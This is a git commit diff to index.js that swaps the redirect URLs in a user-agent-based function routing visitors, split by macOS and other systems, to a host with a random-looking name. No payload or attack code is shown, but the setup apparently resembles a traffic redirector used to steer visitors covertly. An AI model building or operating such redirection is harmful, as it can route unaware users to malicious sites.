b15804cdafb1bf3ab4fa464942d140b5c4573c10
animalinside <akshay.anand12@yahoo.com>
2026-05-02 10:47:10 +0530

    Update index.js

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://laravel-nawqee-refkkp.laravel.cloud/",
-            others: "https://laravel-nawqee-refkkp.laravel.cloud/"
+            macos: "https://kjhgfddfghjk.on-forge.com/",
+            others: "https://kjhgfddfghjk.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://laravel-nawqee-refkkp.laravel.cloud/",
-            others: "https://laravel-nawqee-refkkp.laravel.cloud/"
+            macos: "https://kjhgfddfghjk.on-forge.com/",
+            others: "https://kjhgfddfghjk.on-forge.com/"
         }
     ];
 
